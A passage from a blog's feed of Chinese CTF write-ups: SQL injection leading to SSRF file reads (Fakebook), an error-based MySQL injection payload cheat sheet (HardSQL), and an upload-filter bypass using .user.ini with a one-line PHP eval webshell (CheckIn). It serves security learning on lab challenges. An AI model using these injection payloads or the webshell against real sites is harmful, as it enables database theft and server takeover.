      <link href="/2022/02/08/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/08/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook%201%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="网鼎杯-2018-Fakebook-1题解"><a href="#网鼎杯-2018-Fakebook-1题解" class="headerlink" title="网鼎杯 2018 Fakebook 1题解"></a>网鼎杯 2018 Fakebook 1题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>均可看之前的博客</p><h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h3><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h2 id="做题详解"><a href="#做题详解" class="headerlink" title="做题详解"></a>做题详解</h2><p>首先随便注册一个用户访问，点击username进入到/view.php?no=1的界面，尝试单引号闭合，发现报错，猜测存在sql注入。发现，当no=1时，无论怎么注入，都会显示到初始界面。于是将no的值改为2。<br>尝试union联合查询，构造payload：</p><pre class=" language-1"><code class="language-1">http://fdcb238d-7970-46d5-ac9f-c93d98707d3c.node4.buuoj.cn:81/view.php?no=2%20order%20by%204#</code></pre><p>回显正常，构造payload</p><pre class=" language-1"><code class="language-1">http://fdcb238d-7970-46d5-ac9f-c93d98707d3c.node4.buuoj.cn:81/view.php?no=2%20union%20select%201,2,3,4回显:no hack ~_~</code></pre><p>猜测过滤了union select，用注释绕过</p><pre class=" language-1"><code class="language-1">http://fdcb238d-7970-46d5-ac9f-c93d98707d3c.node4.buuoj.cn:81/view.php?no=2%20union/**/select%201,2,3,4</code></pre><p>发现2是回显位，同时age一栏有回显/var/www/html/view.php，构造payload注数据库名</p><pre class=" language-1"><code class="language-1">http://fdcb238d-7970-46d5-ac9f-c93d98707d3c.node4.buuoj.cn:81/view.php?no=2%20union/**/select%201,database(),3,4回显:fakebook</code></pre><p>构造payload注表名</p><pre class=" language-1"><code class="language-1">http://fdcb238d-7970-46d5-ac9f-c93d98707d3c.node4.buuoj.cn:81/view.php?no=2%20union/**/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema='fakebook'回显：users </code></pre><p>构造payload注列名</p><pre class=" language-1"><code class="language-1">http://fdcb238d-7970-46d5-ac9f-c93d98707d3c.node4.buuoj.cn:81/view.php?no=2%20union/**/select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name='users'回显：no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</code></pre><p>构造payload注数据</p><pre class=" language-1"><code class="language-1">http://fdcb238d-7970-46d5-ac9f-c93d98707d3c.node4.buuoj.cn:81/view.php?no=2%20union/**/select%201,(select%20group_concat(concat(data))),3,4%20from%20fakebook.users回显：O:8:"UserInfo":3:{s:4:"name";s:2:"kb";s:3:"age";i:1;s:4:"blog";s:27:"https://kingofkb.github.io/";} </code></pre><p>得到了一串序列化得到的数据。<br>访问/robots.txt，发现/user.php.bak，访问得到</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBlogContents</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isValidBlog</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>其中有一个get方法。主要的工作是建立会话，然后判断是否是有效的请求，如果不是则返回404，如果不是则返回url的内容，get方法中，curl_exec()如果使用不当就会导致ssrf漏洞。<br>看到大佬博客说扫目录可以扫到flag.php（自己做的时候没有扫到）<br>可以用伪协议file://var/www/html/flag.php访问。<br>最后构造payload（注意同时要改s的长度）</p><pre class=" language-1"><code class="language-1">http://fdcb238d-7970-46d5-ac9f-c93d98707d3c.node4.buuoj.cn:81/view.php?no=2%20union/**/select%201,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'</code></pre><p>至于O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:19;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}的注入位是一个一个试出来的，最后f12找到</p><pre class=" language-1"><code class="language-1">?php$flag = "flag{74572b3f-2766-47bc-88c8-5ce6f094f25a}";exit(0);</code></pre><p>得到flag:flag{74572b3f-2766-47bc-88c8-5ce6f094f25a}</p><p>参考：<br><a href="https://blog.csdn.net/weixin_45642610/article/details/112807706">https://blog.csdn.net/weixin_45642610/article/details/112807706</a><br><a href="https://blog.csdn.net/bazzza/article/details/111412288">https://blog.csdn.net/bazzza/article/details/111412288</a><br><a href="https://www.cnblogs.com/junlebao/p/14104036.html">https://www.cnblogs.com/junlebao/p/14104036.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php伪协议 union联合注入 源码泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战 2019 HardSQL 1题解</title>
      <link href="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20HardSQL%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20HardSQL%201%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="极客大挑战-2019-HardSQL-1题解"><a href="#极客大挑战-2019-HardSQL-1题解" class="headerlink" title="极客大挑战 2019 HardSQL 1题解"></a>极客大挑战 2019 HardSQL 1题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>以下内容摘自<a href="https://blog.csdn.net/silence1_/article/details/90812612">报错注入</a></p><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。学习一下<em><strong>xpath语法错误</strong></em>和***concat+rand()+group_by()***导致主键重复。</p><h4 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h4><p>利用xpath语法错误来进行报错注入主要利用extractvalue和updatexml两个函数。<br>使用条件：mysql版本&gt;5.1.5</p><h5 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h5><pre class=" language-1"><code class="language-1">函数原型：extractvalue(xml_document,Xpath_string)正常语法：extractvalue(xml_document,Xpath_string);第一个参数：xml_document是string格式，为xml文档对象的名称第二个参数：Xpath_string是xpath格式的字符串作用：从目标xml中返回包含所查询值的字符串</code></pre><p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。<br>pyload：id=’and(select extractvalue(“anything”,concat(‘~’,(select语句))))<br>例如：</p><pre class=" language-1"><code class="language-1">id='and(select extractvalue(1,concat('~',(select database()))))id='and(select extractvalue(1,concat(0x7e,@@version)))</code></pre><p>针对mysql数据库：</p><pre class=" language-1"><code class="language-1">查数据库名：id='and(select extractvalue(1,concat(0x7e,(select database()))))爆表名：id='and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))爆字段名：id='and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="TABLE_NAME"))))爆数据：id='and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</code></pre><p>注：<br>1.0x7e=’<del>’<br>2.concat(‘a’,‘b’)=“ab”<br>3.version()=@@version<br>4.‘</del>‘可以换成’#’、’$’等不满足xpath格式的字符<br>5.extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位。也可以用select中的right函数<br>right用法：right(s,n)：返回字符串s最右边的n个字符</p><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h5><pre class=" language-1"><code class="language-1">函数原型：updatexml(xml_document,xpath_string,new_value)正常语法：updatexml(xml_document,xpath_string,new_value)第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：xpath_string是xpath格式的字符串第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值</code></pre><p>第二个参数跟extractvalue函数的第二个参数一样，因此也可以利用，且利用方式相同<br>payload：id=’and(select updatexml(“anything”,concat(‘~’,(select语句())),”anything”))<br>例如：</p><pre class=" language-1"><code class="language-1">'and(select updatexml(1,concat('~',(select database())),1))'and(select updatexml(1,concat(0x7e,@@database),1))</code></pre><p>针对mysql</p><pre class=" language-1"><code class="language-1">爆数据库名：'and(select updatexml(1,concat(0x7e,(select database())),0x7e))爆表名：'and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))爆列名：'and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name="TABLE_NAME")),0x7e))爆数据：'and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</code></pre><h4 id="concat-rand-group-by-导致主键重复"><a href="#concat-rand-group-by-导致主键重复" class="headerlink" title="concat+rand()+group_by()导致主键重复"></a>concat+rand()+group_by()导致主键重复</h4><p>这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。<br>rand()：生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字<br>floor()：对任意正或者负的十进制值向下取整<br>通常利用这两个函数的方法是floor(rand(0))*2 ,其会生成0和1两个数</p><h5 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h5><pre class=" language-1"><code class="language-1">group by是根据一个或多个列对结果集进行分组的sql语句，其用法为：SELECT column_name, aggregate_function(column_name)FROM table_nameWHERE column_name operator valueGROUP BY column_name</code></pre><p>常见的payload为：</p><pre class=" language-1"><code class="language-1">'union select 1 from (select count(*),concat((slelect语句),floor(rand(0)*2))x from "一个足大的表" group by x)a--+</code></pre><p>例如：</p><pre class=" language-1"><code class="language-1">'union select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a--+利用information_schema.tables表，相似的还可以用information_schema.columns等</code></pre><p>为了使结构能够更方便的查看，可以在concat()中添加一些内容</p><pre class=" language-1"><code class="language-1">'union select 1 from (select count(*),concat((select user())," ",floor(rand(0)*2))x from information_schema.tables group by x)a</code></pre><p>之后还是将select语句改为一般的注入语句就可以：</p><pre class=" language-1"><code class="language-1">爆数据库名：'union select 1 from (select count(*),concat((select database())," ",floor(rand(0)*2))x from information_schema.tables group by x)a爆表名：'union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ," ",floor(rand(0)*2))x from information_schema.tables group by x)a爆列名：'union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name="TABLE_NAME" limit 0,1) ," ",floor(rand(0)*2))x from information_schema.tables group by x)a爆数据：'union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ," ",floor(rand(0)*2))x from information_schema.tables group by x)a</code></pre><p>不能使用group_concat函数，所以用limit语句来限制查询结果的列数。</p><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>打开题目，发现是sql注入。<br>尝试单引号闭合，成功。经过测试发现空格，and，=被ban，但or没有被ban。尝试报错注入。<br>爆数据库名。</p><pre class=" language-1"><code class="language-1">1'or(extractvalue(1,concat(0x7e,(select(database())))))#回显：XPATH syntax error: '~geek'</code></pre><p>爆表名，=被ban可用like绕过。</p><pre class=" language-1"><code class="language-1">1'or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')))))#回显：XPATH syntax error: '~H4rDsq1'</code></pre><p>爆列名</p><pre class=" language-1"><code class="language-1">1'or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')))))#回显：XPATH syntax error: '~id,username,password'</code></pre><p>爆数据</p><pre class=" language-1"><code class="language-1">1'or(extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)))))#回显：XPATH syntax error: '~flag{7aa8bf8f-9c3e-4d63-be7a-ab'</code></pre><p>爆右半边数据</p><pre class=" language-1"><code class="language-1">1'or(extractvalue(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)))))#回显：XPATH syntax error: '~f-9c3e-4d63-be7a-ab16760992d1}'</code></pre><p>拼接得到flag:flag{7aa8bf8f-9c3e-4d63-be7a-ab16760992d1}<br>参考：<br><a href="https://blog.csdn.net/silence1_/article/details/90812612">https://blog.csdn.net/silence1_/article/details/90812612</a><br><a href="https://www.cnblogs.com/hackhackgo/p/14658557.html">https://www.cnblogs.com/hackhackgo/p/14658557.html</a><br><a href="https://www.likecs.com/default/index/show?id=116670">https://www.likecs.com/default/index/show?id=116670</a><br><a href="https://www.jianshu.com/p/04ab44c8babd">https://www.jianshu.com/p/04ab44c8babd</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 报错注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF 2019 CheckIn 1题解</title>
      <link href="/2022/01/27/SUCTF%202019%20CheckIn%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/01/27/SUCTF%202019%20CheckIn%201%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="SUCTF-2019-CheckIn-1题解"><a href="#SUCTF-2019-CheckIn-1题解" class="headerlink" title="SUCTF 2019 CheckIn 1题解"></a>SUCTF 2019 CheckIn 1题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="htaccess常用payload"><a href="#htaccess常用payload" class="headerlink" title=".htaccess常用payload"></a>.htaccess常用payload</h3><p>语句的作用是让Apache将1.png以php格式解析</p><pre class=" language-1"><code class="language-1"><FilesMatch "1.png">SetHandler application/x-httpd-php</FilesMatch></code></pre><p>语句的作用是让Apache将其他类型文件均以php格式解析</p><pre class=" language-1"><code class="language-1">SetHandler application/x-httpd-php</code></pre><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>摘自<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">ini文件后门</a></p><p>它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。应用范围可谓很广，不像.htaccess有局限性。<br>什么是.user.ini？</p><p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。 在此可以查看：<a href="http://php.net/manual/zh/ini.list.php">php.ini 配置选项列表</a>这几种模式有什么区别？参考官方文档：<a href="https://www.php.net/manual/zh/configuration.changes.modes.php">配置可被设定范围</a></p><pre class=" language-1"><code class="language-1">PHP_INI_USER     可在用户脚本（例如 ini_set()）或 Windows 注册表以及 .user.ini 中设定PHP_INI_PERDIR     可在 php.ini，.htaccess 或 httpd.conf 中设定PHP_INI_SYSTEM     可在 php.ini 或 httpd.conf 中设定PHP_INI_ALL     可在任何地方设定</code></pre><p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档<a href="https://www.php.net/manual/zh/configuration.file.per-user.php">.user.ini 文件</a>解释了：<br>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$ _ SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。<br>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。<br>这里就很清楚了，.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）<br>实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。<br>而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。<br>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是PHP_INI_SYSTEM模式的（甚至是php.ini only的），包括disable_functions、extension_dir、enable_dl等。 不过，我们可以很容易地借助.user.ini文件来构造一个“后门”。</p><p>Php配置项中有两个比较有意思的项（第一个和第四个）：</p><pre class=" language-1"><code class="language-1">auto_append_file     NULL     PHP_INI_PERDIR      auto_detect_line_endings     "0"     PHP_INI_ALL      auto_globals_jit     "1"     PHP_INI_PERDIR      auto_prepend_file     NULL     PHP_INI_PERDIR      </code></pre><p>点开auto_prepend_file</p><pre class=" language-1"><code class="language-1"> auto_prepend_file string    Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.    The special value none disables auto-prepending.</code></pre><p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p><pre class=" language-1"><code class="language-1">auto_prepend_file=01.gif</code></pre><p>01.gif是要包含的文件。<br>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。<br>那么，我们可以想一下，在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 </p><h3 id="exif-imagetype"><a href="#exif-imagetype" class="headerlink" title="exif_imagetype()"></a>exif_imagetype()</h3><p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。<br>我们可以通过给上传脚本加上相应的幻数头字节就可以绕过：</p><pre class=" language-1"><code class="language-1">JPG ：FF D8 FF E0 00 10 4A 46 49 46GIF(相当于文本的GIF89a)：47 49 46 38 39 61PNG： 89 50 4E 47</code></pre><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// error_reporting(0);</span><span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string">"uploads/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$userdir</span> <span class="token punctuation">.</span> <span class="token string">"/index.php"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"upload"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"fileUpload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"fileUpload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"filesize too big!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment">#检测文件名，不允许为空</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"filename cannot be empty!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment">#正则判断文件名后缀不允许包含ph和htacess且无法通过大小写绕过</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ph|htacess/i"</span><span class="token punctuation">,</span> <span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"illegal suffix!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment">#不允许包含&lt;?</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"&lt;?"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&amp;lt;? in contents!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment">#检测是否为图片类型</span>    <span class="token variable">$image_type</span> <span class="token operator">=</span> <span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$image_type</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"exif_imagetype:not image!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$upload_file_path</span> <span class="token operator">=</span> <span class="token variable">$userdir</span> <span class="token punctuation">.</span> <span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$upload_file_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Your dir "</span> <span class="token punctuation">.</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span> <span class="token string">' &lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'Your files : &lt;br>'</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>首先制作一个.user.ini文件</p><pre class=" language-1"><code class="language-1">GIF89aauto_prepend_file=test.jpg</code></pre><p>然后制作一个图片马，并命名为test.jpg</p><pre class=" language-1"><code class="language-1">GIF89a<script language="php">@eval($_POST['kb'])</script></code></pre><p>先上传1.user.ini文件，回显中包含index.php，确认做题方向正确，然后上传图片马，最后用蚁剑连接uploads/cc551ab005b2e60fbdc88de809b2c4b1/index.php<br>（QWQ复现半天没有成功，不知道是哪里出锅了，希望有大手子浇浇）</p><p>2.4更新：复现成功，名称就为.user.ini文件，前面不能再有东西了，呜呜呜</p><p>参考：<br><a 